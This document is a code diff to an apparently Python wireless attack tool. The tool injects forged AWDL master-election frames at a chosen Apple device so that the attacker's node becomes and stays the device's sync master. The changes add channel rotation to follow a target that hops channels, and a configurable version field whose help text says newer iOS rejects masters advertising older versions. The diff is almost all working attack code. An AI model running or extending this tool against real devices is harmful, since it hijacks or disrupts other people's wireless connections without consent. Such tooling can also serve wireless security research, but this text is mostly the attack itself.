@@ -24,11 +24,11 @@ interface, directed at one specific destination MAC address.
 The frames carry Election Parameters (v1 *and* v2) with a maximal election
 *counter* and *metric*.  Per AWDL's election rule -- reimplemented in
 ``src/election.c`` (``awdl_election_compare_master``: compare the master
-counter first, then the master metric, higher wins) -- a node advertising
-0xFFFFFFFF for both can never be out-voted by a peer whose counter starts at
-0 and only increments once every ~3.14 s.  The injected node therefore
-*guarantees* it becomes (and stays) the AWDL master / sync root that the
-target synchronises to.
+counter first, then the master metric, higher wins) -- a node advertising a
+higher counter can never be out-voted by a peer whose counter starts at 0 and
+only increments once every ~3.14 s.  The injected node therefore *guarantees*
+it becomes (and stays) the AWDL master / sync root that the target
+synchronises to.
 
 How the target is made to accept us as a valid peer (see
 ``awdl_peer_is_valid`` in ``src/peers.c``: ``sent_mif && devclass &&
@@ -79,6 +79,7 @@ AWDL_OUI = b"\x00\x17\xf2"                       # src/frame.h  AWDL_OUI
 AWDL_BSSID = b"\x00\x25\x00\xff\x94\x73"         # src/frame.h  AWDL_BSSID
 AWDL_TYPE = 8                                    # src/frame.h  AWDL_TYPE
 AWDL_VERSION_COMPAT = 0x10                       # awdl_version(1, 0)
+AWDL_VERSION_TLV_DEFAULT = 0xa0                  # Version TLV default: 10.0 (modern iOS/macOS)
 IEEE80211_VENDOR_SPECIFIC = 127
 
 # Action subtypes (enum awdl_action_type)
@@ -132,6 +133,7 @@ BROADCAST = b"\xff\xff\xff\xff\xff\xff"
 # when no channel is given explicitly.
 AWDL_SOCIAL_CHANNELS = [6, 44, 149]
 SWEEP_DWELL_DEFAULT = 3.0        # seconds listened on each channel while sweeping
+CHANNEL_DWELL_DEFAULT = 1.0      # seconds injected on each channel while rotating
 
 ETH_P_ALL = 0x0003               # receive every frame on the monitor interface
 
@@ -210,6 +212,56 @@ def parse_duration(text):
     return value * multiplier
 
 
+def parse_channels(text):
+    """Parse a comma-separated channel list like ``6,44,149`` into ints.
+
+    Each channel must be a supported AWDL social channel.
+    """
+    chans = []
+    for part in str(text).split(","):
+        part = part.strip()
+        if not part:
+            continue
+        try:
+            ch = int(part)
+        except ValueError:
+            raise argparse.ArgumentTypeError("invalid channel: %r" % part)
+        if ch not in CHAN_OPCLASS:
+            raise argparse.ArgumentTypeError(
+                "unsupported channel %d (use %s)"
+                % (ch, "/".join(str(c) for c in sorted(CHAN_OPCLASS))))
+        if ch not in chans:
+            chans.append(ch)
+    if not chans:
+        raise argparse.ArgumentTypeError("no channels given")
+    return chans
+
+
+def parse_awdl_version(text):
+    """Parse ``MAJOR.MINOR`` (e.g. ``10.0``) or a raw byte (e.g. ``0xa0``).
+
+    Returns the single-byte encoding ``(major << 4) | minor`` used in the
+    Version TLV, where each nibble is 0-15.
+    """
+    token = str(text).strip()
+    if "." in token:
+        major_s, _, minor_s = token.partition(".")
+        try:
+            major, minor = int(major_s), int(minor_s)
+        except ValueError:
+            raise argparse.ArgumentTypeError("invalid AWDL version: %r" % text)
+    else:
+        try:
+            value = int(token, 0)
+        except ValueError:
+            raise argparse.ArgumentTypeError("invalid AWDL version: %r" % text)
+        major, minor = (value >> 4) & 0xF, value & 0xF
+    if not (0 <= major <= 0xF and 0 <= minor <= 0xF):
+        raise argparse.ArgumentTypeError(
+            "AWDL version out of range (0.0-15.15): %r" % text)
+    return ((major << 4) & 0xF0) | (minor & 0x0F)
+
+
 # ---------------------------------------------------------------------------
 # frame construction (mirrors src/tx.c)
 # ---------------------------------------------------------------------------
@@ -220,7 +272,8 @@ class AwdlFrameBuilder:
     def __init__(self, src, dst, channel, master_metric, master_counter,
                  self_metric, self_counter, hostname, devclass,
                  aw_period=AW_PERIOD_TU, af_period=PSF_INTERVAL_MASTER_TU,
-                 presence_mode=PRESENCE_MODE, aw_offset=0):
+                 presence_mode=PRESENCE_MODE, aw_offset=0,
+                 awdl_version=AWDL_VERSION_TLV_DEFAULT):
         self.src = src
         self.dst = dst
         self.channel = channel
@@ -230,6 +283,7 @@ class AwdlFrameBuilder:
         self.self_counter = self_counter & UINT32_MAX
         self.hostname = hostname
         self.devclass = devclass
+        self.awdl_version = awdl_version & 0xFF   # advertised in the Version TLV
 
         # AWDL timing parameters advertised in the Sync Parameters TLV.
         self.aw_period = aw_period            # Availability Window period (TU)
@@ -400,7 +454,7 @@ class AwdlFrameBuilder:
 
     # -- Version TLV (type 21) -- needed to make the peer "valid" ----------
     def _version_tlv(self):
-        body = struct.pack("<BB", 0x34, self.devclass)   # version 3.4, devclass
+        body = struct.pack("<BB", self.awdl_version, self.devclass)
         return self._tlv(AWDL_VERSION_TLV, body)
 
     # -- generic TLV header ------------------------------------------------
@@ -646,8 +700,18 @@ def main(argv=None):
                              "(default: interface MAC, else random local MAC)")
     parser.add_argument("-c", "--channel", type=int, default=None,
                         choices=sorted(CHAN_OPCLASS),
-                        help="AWDL social channel; if omitted, the channel is "
-                             "detected by sweeping for the target's frames")
+                        help="single AWDL social channel; if omitted (and no "
+                             "--channels), the channel is detected by sweeping "
+                             "for the target's frames")
+    parser.add_argument("--channels", type=parse_channels, default=None,
+                        metavar="LIST",
+                        help="comma-separated social channels to rotate "
+                             "injection across, e.g. 6,44,149 (covers a target "
+                             "that hops channels); overrides -c/--channel")
+    parser.add_argument("--channel-dwell", type=parse_duration,
+                        default=CHANNEL_DWELL_DEFAULT, metavar="TIME",
+                        help="time injected on each channel per rotation when "
+                             "--channels is used (s/ms/us/tu suffix; default 1s)")
     parser.add_argument("--sweep-dwell", type=float, default=SWEEP_DWELL_DEFAULT,
                         metavar="SECONDS",
                         help="listen time per channel during channel detection")
@@ -657,6 +721,11 @@ def main(argv=None):
                         default=MASTER_COUNTER_BASE,
                         help="starting election master counter; advances every "
                              "frame so the master stays live (default 0x40000000)")
+    parser.add_argument("--awdl-version", type=parse_awdl_version,
+                        default=AWDL_VERSION_TLV_DEFAULT, metavar="VER",
+                        help="AWDL version advertised in the Version TLV, e.g. "
+                             "10.0 (default). Newer iOS/iPadOS rejects a master "
+                             "advertising an old version, so 10.x is required")
     parser.add_argument("--hostname", default="owl-master",
                         help="hostname advertised in the Arpa TLV")
     parser.add_argument("--devclass", choices=sorted(DEVCLASS_NAMES),
@@ -714,24 +783,31 @@ def main(argv=None):
     metric = args.metric & UINT32_MAX
     counter = args.counter & UINT32_MAX
 
-    # Resolve the channel. If none was given, open the radio and sweep the
-    # social channels for the target's AWDL frames, then lock onto the one it
-    # is actually on. In --dry-run there is no live radio, so fall back to 44.
+    # Decide which channel(s) to inject on:
+    #   --channels  -> rotate across the given list
+    #   -c/--channel-> single channel
+    #   neither     -> detect a single channel by sweeping for the target
+    if args.channels:
+        channel_list = list(args.channels)
+    elif args.channel is not None:
+        channel_list = [args.channel]
+    else:
+        channel_list = None
+
     sock = None
     if args.dry_run:
-        channel = args.channel if args.channel is not None else 44
-        if args.channel is None:
-            print("# note: no -c given; using channel %d for --dry-run "
+        channel = channel_list[0] if channel_list else 44
+        if channel_list is None:
+            print("# note: no channel given; using channel %d for --dry-run "
                   "(detection needs a live radio)" % channel)
     else:
         sock = open_injection_socket(args.interface)
-        channel = args.channel
         have_iw = shutil.which("iw") is not None
-        if channel is None:
+        if channel_list is None:
             if not have_iw:
                 sock.close()
                 sys.exit("error: 'iw' is required to detect the channel; "
-                         "install it or pass -c/--channel")
+                         "install it or pass -c/--channel/--channels")
             channel = sweep_for_channel(sock, args.interface, args.target,
                                         AWDL_SOCIAL_CHANNELS, args.sweep_dwell)
             if channel is None:
@@ -740,14 +816,17 @@ def main(argv=None):
                          "pass -c/--channel to set it manually"
                          % mac_str(args.target))
             print("[*] detected target on channel %d" % channel)
+            channel_list = [channel]
             if not set_channel(args.interface, channel):
                 sock.close()
                 sys.exit("error: could not tune interface to channel %d" % channel)
-        elif have_iw:
-            set_channel(args.interface, channel)  # best-effort; may be tuned already
         else:
-            print("[*] 'iw' not found; assuming %s is already on channel %d"
-                  % (args.interface, channel))
+            channel = channel_list[0]
+            if have_iw:
+                set_channel(args.interface, channel)  # best-effort; may be tuned already
+            else:
+                print("[*] 'iw' not found; assuming %s is already on channel %d"
+                      % (args.interface, channel))
 
     builder = AwdlFrameBuilder(
         src=src, dst=args.target, channel=channel,
@@ -756,6 +835,7 @@ def main(argv=None):
         hostname=args.hostname, devclass=DEVCLASS_NAMES[args.devclass],
         aw_period=args.aw_period, af_period=args.af_period,
         presence_mode=args.presence_mode, aw_offset=args.aw_offset,
+        awdl_version=args.awdl_version,
     )
 
     if args.dry_run:
@@ -765,6 +845,8 @@ def main(argv=None):
         print("# channel         : %d" % channel)
         print("# election counter : 0x%08x" % counter)
         print("# election metric  : 0x%08x" % metric)
+        print("# awdl version     : %d.%d"
+              % ((args.awdl_version >> 4) & 0xF, args.awdl_version & 0xF))
         print("# aw/af period     : %d / %d TU" % (args.aw_period, args.af_period))
         print("# presence mode    : %d" % args.presence_mode)
         print("# aw offset        : %d TU" % args.aw_offset)
@@ -773,19 +855,26 @@ def main(argv=None):
         return 0
 
     # sock was opened above while resolving the channel.
+    rotate_channels = channel_list
+    multi = len(rotate_channels) > 1
 
     # graceful Ctrl-C
     stop = {"flag": False}
     signal.signal(signal.SIGINT, lambda *_: stop.update(flag=True))
 
-    print("[*] injecting AWDL MIF on %s (ch %d)" % (args.interface, channel))
-    print("    master   : %s  (counter=0x%08x metric=0x%08x)"
-          % (mac_str(src), counter, metric))
+    chan_str = ",".join(str(c) for c in rotate_channels)
+    print("[*] injecting AWDL MIF on %s (ch %s)" % (args.interface, chan_str))
+    print("    master   : %s  (counter=0x%08x metric=0x%08x awdl=%d.%d)"
+          % (mac_str(src), counter, metric,
+             (args.awdl_version >> 4) & 0xF, args.awdl_version & 0xF))
     print("    directed at: %s" % mac_str(args.target))
     print("    timing   : interval=%s aw=%dTU af=%dTU presence=%d offset=%dTU%s"
           % ("once" if args.interval <= 0 else "%gms" % (args.interval * 1000),
              args.aw_period, args.af_period, args.presence_mode, args.aw_offset,
              "" if args.duration <= 0 else " duration=%gs" % args.duration))
+    if multi:
+        print("    channels : rotating %s (%gs dwell each)"
+              % (chan_str, args.channel_dwell))
     if args.watch:
         print("    watching   : reporting each AWDL peer's advertised master")
     print("    (Ctrl-C to stop)")
@@ -798,8 +887,20 @@ def main(argv=None):
     deadline = start + args.duration if args.duration > 0 else None
     sent = 0
     dropped = 0
+    ci = 0
+    next_switch = time.monotonic() + args.channel_dwell
+    if multi:
+        set_channel(args.interface, rotate_channels[0])
+        builder.channel = rotate_channels[0]
     try:
         while not stop["flag"]:
+            # Rotate to the next channel once the dwell on the current one is up.
+            if multi and time.monotonic() >= next_switch:
+                ci = (ci + 1) % len(rotate_channels)
+                set_channel(args.interface, rotate_channels[ci])
+                builder.channel = rotate_channels[ci]
+                next_switch = time.monotonic() + args.channel_dwell
+
             if send_frame(sock, builder.build(AWDL_ACTION_MIF)):
                 sent += 1
             else:
@@ -829,10 +930,13 @@ def main(argv=None):
             if deadline is not None and time.monotonic() >= deadline:
                 break
 
-            # sleep in small slices so Ctrl-C (and the deadline) stay responsive
+            # sleep in small slices so Ctrl-C, the deadline and the channel
+            # switch all stay responsive
             slept = 0.0
             while slept < args.interval and not stop["flag"]:
                 if deadline is not None and time.monotonic() >= deadline:
+                    break
+                if multi and time.monotonic() >= next_switch:
                     break
                 step = min(0.1, args.interval - slept)
                 time.sleep(step)
